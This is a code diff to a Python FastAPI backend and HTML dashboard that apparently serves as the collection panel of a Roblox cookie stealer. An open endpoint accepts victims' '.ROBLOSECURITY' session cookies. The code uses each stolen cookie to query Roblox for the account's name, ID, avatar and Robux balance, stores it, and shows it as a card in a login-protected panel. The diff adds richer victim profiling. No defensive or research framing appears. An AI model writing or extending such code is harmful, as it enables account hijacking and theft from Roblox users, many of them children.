@@ -55,17 +55,31 @@ def delete_cookie(idx):
 class CookieData(BaseModel):
     cookie: str; username: str; browser: str = "Chrome"; timestamp: str = ""
 
-async def get_robux(cookie: str) -> int:
+async def fetch_profile(cookie: str):
     try:
         async with httpx.AsyncClient() as client:
             r = await client.get("https://users.roblox.com/v1/users/authenticated",
                 headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
-            if r.status_code != 200: return 0
-            uid = r.json().get("id")
+            if r.status_code != 200: return {}
+            data = r.json()
+            uid = data.get("id")
+            name = data.get("name", "")
+            display = data.get("displayName", "")
+
             r2 = await client.get(f"https://economy.roblox.com/v1/users/{uid}/currency",
                 headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
-            return r2.json().get("robux", 0) if r2.status_code == 200 else 0
-    except: return 0
+            robux = r2.json().get("robux", 0) if r2.status_code == 200 else 0
+
+            r3 = await client.get(
+                f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=60x60&format=Png",
+                timeout=10)
+            avatar = ""
+            if r3.status_code == 200:
+                d = r3.json().get("data", [])
+                if d: avatar = d[0].get("imageUrl", "")
+
+            return {"username": name, "display": display, "robux": robux, "avatar": avatar, "id": uid}
+    except: return {}
 
 def require_session(request: Request):
     token = request.cookies.get("session")
@@ -100,14 +114,18 @@ async def logout(request: Request):
 
 @app.post("/api/cookie")
 async def receive_cookie(c: CookieData):
-    robux = await get_robux(c.cookie)
+    prof = await fetch_profile(c.cookie)
     entry = {
         "time": c.timestamp or datetime.utcnow().isoformat(),
-        "username": c.username, "cookie": c.cookie,
-        "browser": c.browser, "robux": robux,
+        "username": prof.get("display") or c.username,
+        "cookie": c.cookie, "browser": c.browser,
+        "robux": prof.get("robux", 0),
+        "avatar": prof.get("avatar", ""),
+        "roblox_user": prof.get("username", ""),
+        "roblox_id": prof.get("id", 0),
     }
     save_cookie(entry)
-    return {"status": "ok", "total": 0, "robux": robux}
+    return {"status": "ok", "total": 0, "robux": entry["robux"]}
 
 @app.get("/api/cookies")
 async def get_cookies(session=Depends(require_session)):
@@ -181,7 +199,10 @@ body{font-family:'Segoe UI',sans-serif;min-height:100vh;background:var(--bg);col
 .card:hover{border-color:var(--accent);box-shadow:var(--glow);transform:translateY(-2px)}
 .card-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
 .card-name{font-size:16px;font-weight:700}
+.card-user{font-size:12px;color:var(--text2);margin-top:1px}
 .card-time{font-size:11px;color:var(--text2)}
+.rbx-avatar{width:44px;height:44px;border-radius:50%;border:2px solid var(--accent);object-fit:cover;flex-shrink:0}
+.rbx-avatar.placeholder{background:var(--card);display:flex;align-items:center;justify-content:center;font-size:20px}
 .card-cookie{font-size:11px;color:var(--text2);word-break:break-all;margin-bottom:12px;padding:8px 10px;background:rgba(0,0,0,.3);border-radius:8px;font-family:monospace;max-height:50px;overflow:hidden;cursor:pointer}
 .card-cookie:hover{max-height:200px}
 .card-bottom{display:flex;justify-content:space-between;align-items:center;gap:8px}
@@ -328,9 +349,13 @@ function renderCards() {
     container.innerHTML = state.cookies.map((c, i) => `
     <div class="card">
       <div class="card-top">
-        <div>
-          <div class="card-name">${c.username}</div>
-          <div class="card-time">${new Date(c.time).toLocaleString()}</div>
+        <div style="display:flex;align-items:center;gap:10px">
+          ${c.avatar ? `<img src="${c.avatar}" class="rbx-avatar">` : '<div class="rbx-avatar placeholder">👤</div>'}
+          <div>
+            <div class="card-name">${c.username}</div>
+            <div class="card-user">@${c.roblox_user || ''}</div>
+            <div class="card-time">${new Date(c.time).toLocaleString()}</div>
+          </div>
         </div>
         <div class="robux-badge">💰 ${c.robux ?? '?'} R$</div>
       </div>
